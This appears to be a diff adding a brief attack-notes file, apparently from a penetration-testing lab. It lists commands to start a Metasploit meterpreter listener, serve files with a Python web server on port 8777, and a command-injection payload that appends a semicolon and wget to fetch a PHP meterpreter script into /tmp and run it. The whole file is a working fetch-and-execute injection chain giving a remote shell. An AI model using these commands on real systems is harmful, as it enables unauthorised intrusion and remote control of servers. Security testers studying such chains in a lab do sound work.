@@ -1,0 +1,5 @@
+Start meterpreter: msfconsole -r php-meter-script.rc
+
+Start Python web server: python -m SimpleHTTPServer 8777
+
+Command Injection: ; wget http://127.0.0.1:8777/php-meter-script.txt -O /tmp/php-meter-script.php; php -f /tmp/php-meter-script.php
